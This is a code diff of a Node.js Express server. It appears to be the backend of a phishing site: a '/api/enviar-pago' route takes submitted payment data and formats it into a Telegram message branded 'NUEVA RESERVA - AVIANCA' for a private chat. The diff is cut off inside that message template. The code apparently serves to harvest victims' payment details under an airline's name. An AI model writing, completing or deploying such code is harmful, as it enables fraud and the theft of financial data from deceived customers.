@@ -1,7 +1,7 @@
 const express = require('express');
 const axios = require('axios');
 const path = require('path');
-const cors = require('cors'); // <-- Agregado para resolver el error CORS
+const cors = require('cors');
 
 const app = express();
 const port = process.env.PORT || 3000;
@@ -16,9 +16,14 @@ if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
 }
 
 // Middleware para habilitar CORS, servir archivos estáticos y procesar JSON
-app.use(cors()); // <-- Habilita las conexiones entre tu web y tu servidor
+app.use(cors());
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json());
+
+// Ruta principal para servir index.html
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
 
 // Función de ayuda para escapar caracteres de Markdown
 function escapeMarkdownV2(text) {
@@ -36,8 +41,7 @@ function escapeMarkdownV2(text) {
 app.post('/api/enviar-pago', async (req, res) => {
     const paymentData = req.body;
     const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
-    
-    // Mensaje formateado para Telegram
+
     const message = `
 ✈️ *NUEVA RESERVA \\- AVIANCA* ✈️
 \\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
